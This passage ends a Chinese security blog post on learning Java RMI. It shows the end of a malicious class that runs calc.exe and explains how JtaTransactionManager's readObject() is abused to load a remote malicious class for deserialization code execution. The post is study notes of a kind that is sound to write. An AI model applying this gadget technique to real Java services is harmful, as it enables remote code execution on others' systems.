class="string">"calc.exe"</span>;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> Exception(exec(cmd));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
利用 JtaTransactionManager 类中可以被控制的 readObject() 方法，从而构造恶意的被序列化类，其中利用 readObject() 会触发远程恶意类中的构造函数这一点，达到目的。<br>最后贴上结果：<br><img src="./result.gif" alt=""></li>
</ul>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul>
<li><a href="https://blog.csdn.net/xinghun_4/article/details/45787549" target="_blank" rel="noopener">java RMI原理详解</a></li>
<li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a></li>
<li><a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">seebug-深入理解 JAVA 反序列化漏洞</a></li>
</ul>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Isabellae</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://is4b3lla3.github.io/2020/06/27/Java%20RMI%E5%AD%A6%E4%B9%A0/">http://is4b3lla3.github.io/2020/06/27/Java%20RMI%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="addthis_inline_share_toolbox pull-right"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=undefined" async></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/17/Webshell%E5%85%8D%E6%9D%80%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AD%A6%E4%B9%A0/"><i class="fa fa-chevron-left">  </i><span>Webshell免杀的思考与学习</span></a></div><div class="next-post pull-right"><a href="/2020/06/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CXXE/"><span>PHP反序列化和XXE的学习</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="disqus_thread"></div><script>var unused = null;
var disqus_config = function () {
  this.page.url = 'http://is4b3lla3.github.io/2020/06/27/Java%20RMI%E5%AD%A6%E4%B9%A0/';
  this.page.identifier = '2020/06/27/Java RMI学习/';
  this.page.title = 'Java RMI学习';
}
var d = document, s = d.createElement('script');
s.src = "https://" + '' +".disqus.com/embed.js";
s.setAttribute('data-timestamp', '' + +new Date());
(d.head || d.body).appendChild(s);</script></div></div><footer class="footer-bg" style="background-image: url(/2700d379fda645e77d754fc4956024c6.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By Isabellae</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>